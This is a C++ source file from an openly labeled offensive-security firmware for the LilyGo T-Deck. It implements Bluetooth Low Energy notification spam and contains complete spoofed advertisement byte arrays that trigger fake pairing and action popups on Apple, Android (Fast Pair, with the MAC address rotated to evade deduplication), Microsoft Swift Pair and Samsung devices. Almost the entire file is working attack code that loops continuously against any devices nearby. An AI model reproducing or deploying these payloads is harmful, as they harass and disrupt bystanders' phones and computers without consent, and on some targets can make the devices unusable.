// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// BLE notification spam — Apple / Android / Microsoft / Samsung
// Advertisement byte arrays from BruceDevices/firmware (AGPL-3.0)
// https://github.com/BruceDevices/firmware/tree/main/src/modules/ble

#include "ble_spam.h"
#include "display_manager.h"
#include "input_handling.h"
#include "constants.h"
#include "fast_pair_keys.h"

#include <NimBLEDevice.h>
#include <SD.h>
#include "esp_random.h"

extern DisplayManager displayManager;
extern InputHandling  inputHandler;

BleSpam bleSpam;

// ── BLE helpers ───────────────────────────────────────────────────────────────

static void bsReinit() {
    NimBLEDevice::init("");   // idempotent — safe on cold boot, no-op if already up
}

static void bsRestoreStack() {
    // Give the NimBLE host task time to fully process the adv-stop event before
    // tearing down the stack — 0ms gap was causing crashes in v2.x.
    vTaskDelay(pdMS_TO_TICKS(200));
    NimBLEDevice::deinit(true);
    vTaskDelay(pdMS_TO_TICKS(100));
    // Do NOT reinit here — same broken pattern that caused buddy→btkbd interference.
    // Next BLE command inits fresh from uninitialised state.
    SD.begin(39);
}

// ── Display helpers ───────────────────────────────────────────────────────────

static void bsDrawHeader(const char* mode) {
    DisplayManager& dm = displayManager;
    dm.clearScreen(); dm.setCursor(10, outputY); dm.setDefaultTextSize();
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("SPAM");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText(mode);
    dm.setTextColor(0x7BEF); dm.println("]");
    dm.printSeparator();
    dm.setCursor(10, dm.getCursorY()); dm.setTextColor(0x7BEF);
    dm.println("[l/a]=type  [q]=stop");
}

static void bsStatus(const char* name, const char* detail, uint32_t count) {
    int y = outputY + LINE_HEIGHT * 2;
    displayManager.fillRect(10, y, SCREEN_WIDTH - 10, LINE_HEIGHT * 3, TFT_BLACK);
    displayManager.setCursor(10, y); displayManager.setTextColor(TFT_WHITE);
    char buf[40];
    snprintf(buf, sizeof(buf), "%.30s", name); displayManager.println(buf);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.setTextColor(TFT_CYAN);
    snprintf(buf, sizeof(buf), "%.30s", detail); displayManager.println(buf);
    displayManager.setCursor(10, displayManager.getCursorY());
    displayManager.setTextColor(0x7BEF);
    snprintf(buf, sizeof(buf), "Sent: %lu", (unsigned long)count);
    displayManager.println(buf);
}

// Returns 0=timeout, +1=next, -1=prev, 'q'=stop
static int bsWait(uint32_t ms) {
    uint32_t t = millis();
    while (millis() - t < ms) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') return 'q';
        if (k == 'l' || k == 'L') return +1;
        if (k == 'a' || k == 'A') return -1;
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    return 0;
}

static void bsAdvertAndStart(NimBLEAdvertisementData& ad) {
    NimBLEAdvertising* pAdv = NimBLEDevice::getAdvertising();
    // Non-connectable undirected: devices see the popup but cannot connect to us
    pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    pAdv->setAdvertisementData(ad);
    pAdv->setMinInterval(32); pAdv->setMaxInterval(48);  // 20ms–30ms, within BLE spec
    pAdv->start();  // NimBLE stops previous adv automatically
}

// ── Apple — AppleJuice (Proximity Pairing) + SourApple (Nearby Info) ─────────
// Byte arrays and format from BruceDevices/firmware ble_spam.cpp (AGPL-3.0)
// AppleJuice: Proximity Pairing type 0x07 — triggers AirPods/device popup on iOS
// SourApple:  Nearby Info   type 0x0F — triggers action popup on iOS

// Device model bytes for Proximity Pairing (Apple Continuity Protocol)
static const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03,
    0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09,
    0x17, 0x12, 0x16
};
static const int IOS1_COUNT = (int)sizeof(IOS1);

// Action/type bytes for Nearby Info (SourApple)
static const uint8_t SOUR_TYPES[] = {
    0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f,
    0x01, 0x06, 0x20, 0xc0
};
static const int SOUR_COUNT = (int)sizeof(SOUR_TYPES);

static const int APPLE_TOTAL = IOS1_COUNT + SOUR_COUNT;

// AppleJuice — Proximity Pairing advertisement (AirPods pairing popup)
static void appleJuiceAdvert(uint8_t modelByte) {
    NimBLEAdvertisementData ad;
    ad.setFlags(0x06);

    uint8_t pkt[26] = {
        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, modelByte,
        0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
        0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
    };
    ad.addData(pkt, sizeof(pkt));
    bsAdvertAndStart(ad);
}

// SourApple — Nearby Info advertisement (iOS action popup)
static void sourAppleAdvert(uint8_t typeByte) {
    NimBLEAdvertisementData ad;
    ad.setFlags(0x06);

    uint8_t pkt[17];
    pkt[0]  = 0x10; pkt[1] = 0xff; pkt[2] = 0x4c; pkt[3] = 0x00;
    pkt[4]  = 0x0f; pkt[5] = 0x05; pkt[6] = 0xc1; pkt[7] = typeByte;
    esp_fill_random(&pkt[8], 3);
    pkt[11] = 0x00; pkt[12] = 0x00; pkt[13] = 0x10;
    esp_fill_random(&pkt[14], 3);
    ad.addData(pkt, sizeof(pkt));
    bsAdvertAndStart(ad);
}

void BleSpam::spamApple() {
    bsDrawHeader("APPLE");
    bsReinit();
    int i = 0; uint32_t count = 0;
    while (true) {
        char name[24], detail[24];
        if (i < IOS1_COUNT) {
            snprintf(name,   sizeof(name),   "AppleJuice #%d", i);
            snprintf(detail, sizeof(detail), "Prox Pair 0x%02X", IOS1[i]);
            appleJuiceAdvert(IOS1[i]);
        } else {
            int si = i - IOS1_COUNT;
            snprintf(name,   sizeof(name),   "SourApple #%d", si);
            snprintf(detail, sizeof(detail), "NearInfo 0x%02X", SOUR_TYPES[si]);
            sourAppleAdvert(SOUR_TYPES[si]);
        }
        count++;
        bsStatus(name, detail, count);
        int r = bsWait(3000);
        NimBLEDevice::getAdvertising()->stop();
        if (r == 'q') break;
        if (r == +1)       i = (i + 1) % APPLE_TOTAL;
        else if (r == -1)  i = (i == 0) ? APPLE_TOTAL - 1 : i - 1;
        else               i = (i + 1) % APPLE_TOTAL;
    }
    bsRestoreStack();
    displayManager.printCommandScreen();
}

// ── Android — Google Fast Pair advertisement flood ────────────────────────────
// Format from BruceDevices/firmware ble_spam.cpp (AGPL-3.0)
// UUID list + Service Data (FE2C + 3-byte model ID) + TX Power

static void androidFpAdvert(uint32_t mid) {
    NimBLEAdvertisementData ad;
    ad.setFlags(0x06);

    // Exact BruceDevices format: UUID list + service data, no TX power
    uint8_t pkt[11] = {
        0x03, 0x03, 0x2c, 0xfe,                              // Complete 16-bit UUIDs: 0xFE2C
        0x06, 0x16, 0x2c, 0xfe,                              // Service Data UUID 0xFE2C
        (uint8_t)(mid >> 16), (uint8_t)(mid >> 8), (uint8_t)(mid & 0xff)  // 3-byte model ID
    };
    ad.addData(pkt, sizeof(pkt));
    bsAdvertAndStart(ad);
}

void BleSpam::spamAndroid() {
    bsDrawHeader("ANDROID");
    NimBLEDevice::init("");   // ensure initialized before first per-cycle deinit
    int i = 0; uint32_t count = 0;
    while (true) {
        // New random MAC every cycle — Android deduplicates by MAC+modelId pair
        NimBLEDevice::deinit(true);
        vTaskDelay(pdMS_TO_TICKS(20));
        NimBLEDevice::init("");

        int idx = i % FP_KNOWN_COUNT;
        androidFpAdvert(FP_KNOWN_DEVICES[idx].modelId);
        count++;
        char detail[24]; snprintf(detail, sizeof(detail), "FP: %06X", FP_KNOWN_DEVICES[idx].modelId);
        bsStatus(FP_KNOWN_DEVICES[idx].name, detail, count);
        int r = bsWait(10000);   // 10 s — Android needs time to scan + show popup
        NimBLEDevice::getAdvertising()->stop();
        if (r == 'q') break;
        if (r == +1)       i = (i + 1) % FP_KNOWN_COUNT;
        else if (r == -1)  i = (i == 0) ? FP_KNOWN_COUNT - 1 : i - 1;
        else               i = (i + 1) % FP_KNOWN_COUNT;
    }
    bsRestoreStack();
    displayManager.printCommandScreen();
}

// ── Microsoft Swift Pair ──────────────────────────────────────────────────────
// Format from BruceDevices/firmware ble_spam.cpp (AGPL-3.0)
// Manufacturer data: company 0x0006 (Microsoft) + 0x03 0x00 0x80 + device name

struct MsType { const char* name; };
static const MsType MS_TYPES[] = {
    {"MS Audio"},
    {"MS Headphones"},
    {"MS Keyboard"},
    {"MS Mouse"},
    {"MS Gamepad"},
    {"MS Speaker"},
};
static const int MS_COUNT = (int)(sizeof(MS_TYPES) / sizeof(MS_TYPES[0]));

static void msAdvert(const char* devName) {
    NimBLEAdvertisementData ad;
    ad.setFlags(0x06);

    size_t nameLen = strlen(devName);
    // [length][0xFF][0x06][0x00][0x03][0x00][0x80][name...]
    size_t pktLen = 7 + nameLen;
    uint8_t pkt[32] = {};
    pkt[0] = (uint8_t)(6 + nameLen);   // length byte
    pkt[1] = 0xff;                      // Manufacturer Specific
    pkt[2] = 0x06; pkt[3] = 0x00;      // Microsoft company ID LE (0x0006)
    pkt[4] = 0x03; pkt[5] = 0x00; pkt[6] = 0x80;
    memcpy(&pkt[7], devName, nameLen);
    ad.addData(pkt, pktLen);
    bsAdvertAndStart(ad);
}

void BleSpam::spamMicrosoft() {
    bsDrawHeader("MS");
    bsReinit();
    int i = 0; uint32_t count = 0;
    while (true) {
        const char* name = MS_TYPES[i].name;
        msAdvert(name);
        count++;
        char detail[24]; snprintf(detail, sizeof(detail), "Swift Pair");
        bsStatus(name, detail, count);
        int r = bsWait(3000);
        NimBLEDevice::getAdvertising()->stop();
        if (r == 'q') break;
        if (r == +1)       i = (i + 1) % MS_COUNT;
        else if (r == -1)  i = (i == 0) ? MS_COUNT - 1 : i - 1;
        else               i = (i + 1) % MS_COUNT;
    }
    bsRestoreStack();
    displayManager.printCommandScreen();
}

// ── Samsung Galaxy BLE spam ───────────────────────────────────────────────────
// Format from BruceDevices/firmware ble_spam.cpp (AGPL-3.0)
// 15-byte manufacturer data: Samsung (0x0075) + fixed payload + model byte

struct SamsungType { const char* name; uint8_t modelByte; };
static const SamsungType SAMSUNG_TYPES[] = {
    {"Galaxy Buds",       0x1a},
    {"Galaxy Buds+",      0x1b},
    {"Galaxy Buds Live",  0x1c},
    {"Galaxy Buds Pro",   0x1d},
    {"Galaxy Buds2",      0x1e},
    {"Galaxy Buds2 Pro",  0x1f},
    {"Galaxy Buds FE",    0x20},
    {"Galaxy Watch4",     0x0e},
    {"Galaxy Watch5",     0x0f},
    {"Galaxy Watch6",     0x10},
    {"Galaxy Watch FE",   0x11},
};
static const int SAMSUNG_COUNT = (int)(sizeof(SAMSUNG_TYPES) / sizeof(SAMSUNG_TYPES[0]));

static void samsungAdvert(uint8_t modelByte) {
    NimBLEAdvertisementData ad;
    ad.setFlags(0x06);

    // length=0x0e=14: 14 bytes follow (type + company_id + 11 payload bytes)
    uint8_t pkt[15] = {
        0x0e, 0xff, 0x75, 0x00,   // len=14, Mfr Specific, Samsung (0x0075)
        0x01, 0x00, 0x02, 0x00,   // fixed payload
        0x01, 0x01, 0xff, 0x00,
        0x00, 0x43, modelByte
    };
    ad.addData(pkt, sizeof(pkt));
    bsAdvertAndStart(ad);
}

void BleSpam::spamSamsung() {
    bsDrawHeader("SAMSUNG");
    bsReinit();
    int i = 0; uint32_t count = 0;
    while (true) {
        const SamsungType& t = SAMSUNG_TYPES[i];
        samsungAdvert(t.modelByte);
        count++;
        char detail[24]; snprintf(detail, sizeof(detail), "ID: 0x%02X", t.modelByte);
        bsStatus(t.name, detail, count);
        int r = bsWait(3000);
        NimBLEDevice::getAdvertising()->stop();
        if (r == 'q') break;
        if (r == +1)       i = (i + 1) % SAMSUNG_COUNT;
        else if (r == -1)  i = (i == 0) ? SAMSUNG_COUNT - 1 : i - 1;
        else               i = (i + 1) % SAMSUNG_COUNT;
    }
    bsRestoreStack();
    displayManager.printCommandScreen();
}

// ── All — cycle every vendor type ─────────────────────────────────────────────

void BleSpam::spamAll() {
    bsDrawHeader("ALL");
    bsReinit();
    uint32_t count = 0;
    int ai = 0, andi = 0, mi = 0, si = 0;
    int vendor = 0;  // 0=apple, 1=android, 2=ms, 3=samsung

    while (true) {
        const char* name = nullptr;
        char detail[28] = {};

        if (vendor == 0) {
            if (ai < IOS1_COUNT) {
                name = "AppleJuice";
                snprintf(detail, sizeof(detail), "[APPLE] 0x%02X", IOS1[ai]);
                appleJuiceAdvert(IOS1[ai]);
            } else {
                int si2 = ai - IOS1_COUNT;
                name = "SourApple";
                snprintf(detail, sizeof(detail), "[APPLE] 0x%02X", SOUR_TYPES[si2 % SOUR_COUNT]);
                sourAppleAdvert(SOUR_TYPES[si2 % SOUR_COUNT]);
            }
            ai = (ai + 1) % APPLE_TOTAL;
        } else if (vendor == 1) {
            int idx = andi % FP_KNOWN_COUNT;
            name = FP_KNOWN_DEVICES[idx].name;
            snprintf(detail, sizeof(detail), "[ANDROID] %06X", FP_KNOWN_DEVICES[idx].modelId);
            androidFpAdvert(FP_KNOWN_DEVICES[idx].modelId); andi++;
        } else if (vendor == 2) {
            name = MS_TYPES[mi].name;
            snprintf(detail, sizeof(detail), "[MS] SwiftPair");
            msAdvert(name); mi = (mi + 1) % MS_COUNT;
        } else {
            const SamsungType& t = SAMSUNG_TYPES[si];
            name = t.name;
            snprintf(detail, sizeof(detail), "[SAMSUNG] 0x%02X", t.modelByte);
            samsungAdvert(t.modelByte); si = (si + 1) % SAMSUNG_COUNT;
        }
        count++;
        bsStatus(name, detail, count);

        // Android needs longer — Fast Pair popup takes ~5 s to appear on phone
        int r = bsWait(vendor == 1 ? 8000 : 2500);
        NimBLEDevice::getAdvertising()->stop();
        if (r == 'q') break;
        if (r == +1 || r == 0) vendor = (vendor + 1) % 4;
        else if (r == -1)      vendor = (vendor == 0) ? 3 : vendor - 1;
    }
    bsRestoreStack();
    displayManager.printCommandScreen();
}

// ── BleSpam::command() ────────────────────────────────────────────────────────

void BleSpam::command(const char* args) {
    if (!args || !*args || strcmp(args, "apple") == 0 || strcmp(args, "ios") == 0)
        { spamApple();    return; }
    if (strcmp(args, "android") == 0)
        { spamAndroid();  return; }
    if (strcmp(args, "ms") == 0 || strcmp(args, "windows") == 0 || strcmp(args, "microsoft") == 0)
        { spamMicrosoft(); return; }
    if (strcmp(args, "samsung") == 0 || strcmp(args, "galaxy") == 0)
        { spamSamsung();  return; }
    if (strcmp(args, "all") == 0)
        { spamAll();      return; }

    displayManager.setTextColor(TFT_YELLOW);
    displayManager.println("Usage: bs [apple|android|ms|samsung|all]");
    displayManager.printCommandScreen();
}
